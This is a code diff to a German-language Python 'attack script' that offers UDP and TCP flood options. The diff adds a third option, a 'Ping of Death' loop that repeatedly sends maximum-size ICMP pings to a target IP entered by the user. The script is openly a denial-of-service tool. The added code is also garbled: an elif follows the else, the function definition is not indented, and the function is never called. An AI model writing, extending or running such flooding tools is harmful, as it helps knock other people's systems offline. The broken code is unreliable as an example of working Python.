@@ -17,6 +17,7 @@ print("Willkommen zum Angriffsskript!")
 print("Bitte wählen Sie eine Angriffsmethode:")
 print("1 - UDP Flood")
 print("2 - TCP Flood")
+print("3 - POD Flood")
 
 # Auswahl der Methode
 method = input("Wähle die Angriffsmethode (1/2/3): ")
@@ -57,3 +58,14 @@ elif method == "2":
 
 else:
     print("Ungültige Auswahl. Das Programm wird beendet.")
+    
+elif method == "3":
+# POD Flood
+
+def ping_of_death(ip):
+    print("Starte Ping of Death...")
+    try:
+        while True:
+            os.system(f"ping -s 65507 {ip}")  # Maximale Paketgröße für ICMP
+    except KeyboardInterrupt:
+        print("Ping of Death beendet.")
